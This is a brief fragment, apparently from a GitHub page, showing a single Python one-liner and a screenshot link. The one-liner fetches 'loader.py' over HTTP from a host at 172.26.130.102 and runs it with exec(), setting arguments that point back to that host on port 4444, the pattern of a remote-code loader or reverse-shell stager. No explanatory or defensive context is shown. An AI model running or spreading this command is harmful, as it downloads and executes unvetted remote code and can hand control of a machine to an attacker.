...
```python3 -c "import urllib.request, sys; sys.argv = ['loader.py', '-i', '172.26.130.102', '-p', '4444']; exec(urllib.request.urlopen('http://172.26.130.102:80/loader.py').read())"```
<img width="1372" height="509" alt="image" src="https://github.com/user-attachments/assets/ca317cdd-8bdf-4732-8f52-c256e53d162b" />
